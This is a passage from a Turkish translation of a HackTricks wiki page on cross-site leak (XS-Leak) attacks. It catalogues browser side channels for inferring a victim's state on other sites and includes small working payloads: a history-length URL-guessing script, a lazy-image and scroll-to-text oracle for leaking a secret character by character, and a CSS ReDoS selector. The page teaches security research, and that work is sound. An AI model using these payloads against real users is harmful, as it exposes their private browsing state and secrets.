* **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Özet:** URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirlemek için tarayıcının yönlendirme sınırını kullanın.
* **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının takip edeceği **maksimum** yönlendirme sayısı **20** ise, bir saldırgan sayfasını **19 yönlendirme** ile yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya **yönlendirebilir**. Eğer bir **hata** tetiklenirse, o zaman sayfa kurbanı **yönlendirmeye çalışıyordu**.

### Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Özet:** JavaScript kodu tarayıcı geçmişini manipüle edebilir ve uzunluk özelliği ile erişilebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'si**, JavaScript kodunun tarayıcı geçmişini manipüle etmesine izin verir, bu da bir kullanıcının ziyaret ettiği sayfaları **kaydeder**. Bir saldırgan uzunluk özelliğini dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML gezinmesini algılamak için.\
`history.length`'i kontrol etmek, bir kullanıcının bir sayfaya **gezinmesini sağlamak**, aynı kök dizine **geri döndürmek** ve **`history.length`**'in yeni değerini **kontrol etmek**.

### Aynı URL ile Geçmiş Uzunluğu

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: URL tahmin edilenle aynıysa
* **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/açılır pencerenin konumunun belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
* **Kod Örneği**: Aşağıda

Bir saldırgan JavaScript kodunu kullanarak **çerçeve/açılır pencerenin konumunu tahmin edilen bir yere manipüle edebilir** ve hemen **`about:blank`**'e **değiştirebilir**. Eğer geçmiş uzunluğu artarsa, bu URL'nin doğru olduğunu ve **artma süresi olduğunu** gösterir çünkü URL aynı ise yeniden yüklenmez. Eğer artmazsa, bu tahmin edilen URL'yi yüklemeye çalıştığını **ancak hemen sonra** **`about:blank`**'i yüklediğimiz için, geçmiş uzunluğu tahmin edilen URL'yi yüklerken hiçbir zaman artmaz.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Kare Sayma

* **Dahil Etme Yöntemleri**: Kareler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Özet:** `window.length` özelliğini inceleyerek iframe öğelerinin miktarını değerlendirin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Bir web sayfasındaki **iframe** veya **window.open** ile açılan **kare sayısını saymak**, kullanıcının o sayfadaki **durumunu belirlemeye yardımcı olabilir**.\
Ayrıca, sayfada her zaman aynı sayıda kare varsa, kare sayısını **sürekli olarak kontrol etmek**, sızdırılabilecek bilgileri belirlemeye yardımcı olabilir.

Bu teknikte bir örnek olarak, Chrome'da bir **PDF**, içsel olarak bir `embed` kullanıldığı için **kare sayımı** ile **tespit edilebilir**. `zoom`, `view`, `page`, `toolbar` gibi bazı kontrol sağlayan [Açık URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) bulunmaktadır, bu teknik ilginç olabilir.

### HTMLElements

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Özet:** Sızan değeri okuyarak 2 olası durum arasındaki farkı ayırt edin
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML öğeleri aracılığıyla bilgi sızıntısı, özellikle dinamik medya dosyalarının kullanıcı bilgilerine dayalı olarak oluşturulduğu veya filigranların eklendiği durumlarda web güvenliğinde bir endişe oluşturur, medya boyutu değiştirilir. Bu, saldırganların belirli HTML öğeleri tarafından açığa çıkarılan bilgileri analiz ederek olası durumlar arasındaki farkı ayırt etmelerini sağlayabilir.

### HTML Öğeleri Tarafından Açığa Çıkarılan Bilgiler

* **HTMLMediaElement**: Bu öğe medyanın `süresini` ve `buffered` sürelerini ortaya çıkarır, bu bilgilere API'si aracılığıyla erişilebilir. [HTMLMediaElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ve `videoWidth` özelliklerini ortaya çıkarır. Bazı tarayıcılarda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler mevcuttur, medya içeriği hakkında daha detaylı bilgi sunar. [HTMLVideoElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Bu işlev, video oynatma kalitesi hakkında detaylar sağlar, işlenen video veri miktarını belirtebilen `totalVideoFrames` dahil. [getVideoPlaybackQuality() hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Bu öğe bir resmin `yüksekliğini` ve `genişliğini` sızdırır. Ancak, bir resim geçersizse, bu özellikler 0 döndürecek ve `image.decode()` işlevi reddedilecektir, resmi doğru şekilde yüklenemediğini belirten. [HTMLImageElement hakkında daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Özelliği

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Özet:** Kullanıcının durumu veya durumu ile ilişkilendirilen web sitesi stilindeki değişiklikleri belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, **kullanıcının durumuna bağlı olarak web sitesi stilini değiştirebilir**. Cross-origin CSS dosyaları, **HTML link öğesi** ile saldırgan sayfasına gömülebilir ve **kurallar** saldırgan sayfasına **uygulanır**. Bir sayfa bu kuralları dinamik olarak değiştirirse, bir saldırgan bu farkları kullanıcı durumuna bağlı olarak **algılayabilir**.\
Bir sızıntı tekniği olarak, saldırgan belirli bir HTML öğesinin CSS özelliklerini **okumak** için `window.getComputedStyle` yöntemini kullanabilir. Sonuç olarak, etkilenen öğe ve özellik adı biliniyorsa, bir saldırgan keyfi CSS özelliklerini okuyabilir.

### CSS Geçmişi

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Özet:** Bir URL'ye `:visited` stili uygulandığında ziyaret edildiğini belirleyin
* **Kod Örneği**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Buna**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) göre, bu headless Chrome'da çalışmıyor.
{% endhint %}

CSS `:visited` seçicisi, kullanıcı tarafından daha önce ziyaret edilmiş URL'leri farklı şekilde biçimlendirmek için kullanılır. Geçmişte, `getComputedStyle()` yöntemi bu stil farklarını belirlemek için kullanılabilirdi. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu ortaya çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, her zaman bağlantının ziyaret edilmiş gibi hesaplanan stilin döndürülmesini ve `:visited` seçicisi ile uygulanabilecek stilleri kısıtlamayı içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak ayırt etmek mümkündür. Bir teknik, kullanıcıyı CSS'den etkilenen bir alana etkileşime sokarak, özellikle `mix-blend-mode` özelliğini kullanarak kullanır. Bu özellik, öğelerin arka planlarıyla karıştırılmasına izin verir ve kullanıcı etkileşimine dayanarak ziyaret edilmiş durumu ortaya çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan bağlantıların render zamanlamalarını sömürerek algılama sağlanabilir. Tarayıcılar ziyaret edilen ve ziyaret edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu, renderleme sürecinde ölçülebilir bir zaman farkı oluşturabilir. Bu tekniği, ziyaret edilmiş durumu zamanlama analizi yoluyla algılanabilir hale getirmek için birden fazla bağlantı kullanarak gösteren bir kanıt konsepti (PoC), bir Chromium hata raporunda belirtilmiştir.

Bu özellikler ve yöntemler hakkında daha fazla ayrıntı için belgelerine göz atın:

* `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame Leak

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Özet:** Google Chrome'da, bir sayfanın X-Frame-Options kısıtlamaları nedeniyle çapraz kökenli bir siteye gömülmesi engellendiğinde, özel bir hata sayfası görüntülenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömülüyorsa, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için diğer tarayıcılardan farklı olarak boş bir belge nesnesi (null yerine) döndürür. Saldırganlar, boş belgeyi algılayarak geliştiricilerin X-Frame-Options başlığını tutarsız bir şekilde ayarladığı durumlarda, özellikle hata sayfalarını göz ardı ettiğinde, kullanıcının durumu hakkında bilgi açığa çıkarabilir. Bu tür sızıntıları önlemek için güvenlik başlıklarının farkında olunması ve tutarlı bir şekilde uygulanması önemlidir.

### İndirme Tespiti

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devam eden erişilebilirliği, başarılı dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği görüntülemek yerine indirmesini talimat verir. Bu davranış, bir kullanıcının bir dosya indirme tetikleyen bir sayfaya erişiminin olup olmadığını tespit etmek için sömürülebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik bulunmaktadır:

1. **İndirme Çubuğu İzleme**:
* Bir dosya Chromium tabanlı tarayıcılarda indirildiğinde, tarayıcı penceresinin altında bir indirme çubuğu görünür.
* Saldırganlar, pencere yüksekliğindeki değişiklikleri izleyerek indirme çubuğunun görünümünü çıkarabilir ve bir indirme başlatıldığını ima edebilir.
2. **İframelerle İndirme Navigasyonu**:
* Bir sayfa, `Content-Disposition: attachment` başlığını kullanarak bir dosya indirme tetiklediğinde, bir navigasyon olayına neden olmaz.
* İçeriği bir iframede yükleyerek ve navigasyon olaylarını izleyerek, içerik düzeninin bir dosya indirme neden olup olmadığını kontrol etmek mümkündür (navigasyon olmaz).
3. **İframeler Olmadan İndirme Navigasyonu**:
* İframe tekniğiyle benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
* Yeni açılan pencerede navigasyon olaylarını izleyerek, bir dosya indirme tetiklenip tetiklenmediğini (navigasyon olmaz) veya içeriğin içeride görüntülendiğini belirlemek mümkündür (navigasyon gerçekleşir).

Yalnızca giriş yapmış kullanıcıların bu tür indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine verdiği yanıttan dolayı dolaylı olarak kullanıcının kimlik doğrulama durumunu çıkarmak için kullanılabilir.

### Bölümlenmiş HTTP Önbellek Atlatma <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Özet:** Bir saldırgan, iframeleri kullanarak dosya indirmelerini ayırt edebilir; iframenin devam eden erişilebilirliği, başarılı dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu tekniği ilginç kılan şey şudur: Chrome artık **önbellek bölümlendirmesine** sahiptir ve yeni açılan sayfanın önbellek anahtarı şudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ancak bir ngrok sayfası açarsam ve içinde fetch kullanırsam, önbellek anahtarı şu olacaktır: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılamaz. Daha fazla ayrıntıya [buradan](https://developer.chrome.com/blog/http-cache-partitioning/) ulaşabilirsiniz.\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Eğer bir site `example.com`, `*.example.com/resource` kaynağını içeriyorsa, o kaynağın **önbellekleme anahtarı**, kaynağın doğrudan **üst düzey gezinme** ile istendiği gibi olacaktır. Çünkü önbelleğe erişmek, bir kaynağı yüklemekten daha hızlıdır, sayfanın konumunu değiştirmeye çalışabilir ve durdurmayı 20ms (örneğin) sonra iptal etmeye çalışabilirsiniz. Eğer durdurmadan sonra köken değiştiyse, kaynağın önbelleğe alındığı anlamına gelir.\
Ya da sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch gönderebilir ve alınma süresini ölçebilirsiniz**.

### Manuel Yönlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha Fazla Bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Özet:** Bir fetch isteğine verilen yanıtın bir yönlendirme olup olmadığını bulmak mümkündür
* **Kod Örneği**:

![](<../../.gitbook/assets/image (766).png>)

### AbortController ile Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Özet:** Bir kaynağı yüklemeye çalışabilir ve yüklenmeden önce yüklemenin kesilmesi mümkündür. Bir hata tetiklenirse, kaynağın önbelleğe alınıp alınmadığına bağlı olarak, kaynak önbelleğe alınmıştır veya alınmamıştır.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Belirli bir kaynağın tarayıcı önbelleğinde olup olmadığını tespit etmek ve belirli bir kaynağı tarayıcı önbelleğinden çıkarmak için _**fetch**_ ve _**setTimeout**_ kullanın. Ayrıca, yeni içerik önbelleğe alınmadan işlem gerçekleşir.
### Komut Kirliliği

* **Dahil Etme Yöntemleri**: HTML Elemanları (script)
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Özet:** **Dahili fonksiyonları üzerine yazmak** ve hatta **çapraz kökenli betikten** (doğrudan okunamayan) bu argümanları okumak mümkündür, bu değerli bilgilerin **sızmasına** neden olabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet İşçileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Özet:** Bir web sitesinin yürütme süresini hizmet işçileri kullanarak ölçün.
* **Kod Örneği**:

Verilen senaryoda, saldırgan **hizmet işçilerinden** birini, özellikle "saldırgan.com" alanlarından birinde kaydeder. Sonra, saldırgan hedef web sitesindeki ana belgeden yeni bir pencere açar ve **hizmet işçisine** bir zamanlayıcı başlatmasını talimat verir. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **hizmet işçisi** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin varışı sırasında, **hizmet işçisi** etkin bir şekilde navigasyon sürecini sonlandıran bir **204 (İçerik Yok)** durum kodu ile yanıt verir. Bu noktada, **hizmet işçisi** önceki adımda başlatılan zamanlayıcıdan bir ölçüm yakalar. Bu ölçüm, navigasyon sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Getirme Zamanlaması

* **Dahil Etme Yöntemleri**: Getirme API'si
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Özet:** Bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Çapraz-Pencere Zamanlaması

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Özet:** `window.open` kullanarak bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanın. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Yeniden Enjeksiyon ile

Burada, bir çapraz kökenli HTML'den bilgi sızdırmak için teknikler bulabilirsiniz **HTML içeriği enjekte ederek**. Bu teknikler, herhangi bir nedenle **JS kodu enjekte edemeyebileceğiniz** durumlarda ilginç olabilir.

### Sarkan İşaretleme

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Görüntü Tembel Yükleme

Eğer **içerik sızdırmak** ve **gizli öncesine HTML ekleyebiliyorsanız** **ortak sarkan işaretleme tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenden dolayı **her karakteri** (belki iletişim önbellek vuruşu yoluyla) yapmak **ZORUNDA** iseniz bu hileyi kullanabilirsiniz.

HTML'deki **resimlerin** bir "**yükleniyor**" özniteliği vardır ve değeri "**tembel**" olabilir. Bu durumda, resim yalnızca görüntülendiğinde yüklenecek ve sayfa yüklenirken değil:
```html
<img src=/something loading=lazy >
```
Bu nedenle yapabileceğiniz şey, **çok sayıda gereksiz karakter eklemek**tir (Örneğin **binlerce "W"** gibi) **gizli olan web sayfasını doldurmak için veya şöyle bir şey eklemek için** `<br><canvas height="1850px"></canvas><br>.`\
Sonra örneğin **enjeksiyonumuz bayrağın önünde görünüyorsa**, **resim yüklenecek**, ancak bayrağın **arkasında görünüyorsa**, bayrak + gereksiz karakterler **yükleme işlemini engelleyecektir** (ne kadar gereksiz karakter yerleştireceğinizle oynamanız gerekecek). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) ne olduğunu gösterir.

Başka bir seçenek, izin veriliyorsa **scroll-to-text-fragment**'i kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini sağlamak için** şöyle bir şey yapabilirsiniz:
```
#:~:text=SECR
```
Web sayfası şöyle olacak: **`https://victim.com/post.html#:~:text=SECR`**

Burada post.html saldırganın gereksiz karakterleri ve tembel yükleme görüntüsünü içerir ve ardından botun sırrı eklenir.

Bu metin, botun sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlayacaktır. Çünkü bu metin sır ve **görüntünün hemen altında** yer alır ve **görüntü yalnızca tahmin edilen sır doğruysa yüklenir**. Bu şekilde, sırrı **harf harf dışarı sızdırmak için bir oracle** elde etmiş olursunuz.

Bunu sömürmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Görüntü Tembel Yükleme Zaman Tabanlı

Eğer **harici bir görüntü yüklemek mümkün değilse** ve bu, saldırganın görüntünün yüklendiğini göstermesi gerekiyorsa, başka bir seçenek **birkaç kez karakter tahmin etmeye çalışmak ve bunu ölçmektir**. Eğer görüntü yüklenirse, tüm isteklerin yüklenmediğinde olduğundan daha uzun sürmesi gerekir. Bu, [**bu yazının çözümünde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **kullanılan şeydir:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, **bazı HTML içeriğinin varlığını zamanlama ile tespit etmek mümkündür**, çünkü eğer `main[id='site-main']` seçicisi eşleşmiyorsa, geri kalan **seçicileri kontrol etmesine gerek yoktur**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Enjeksiyonu

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde önerilen önlemler bulunmaktadır ve her bölümde [https://xsleaks.dev/](https://xsleaks.dev/) wiki sayfasında da korunma yöntemleri hakkında daha fazla bilgi bulabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) ile
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **otomatik iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
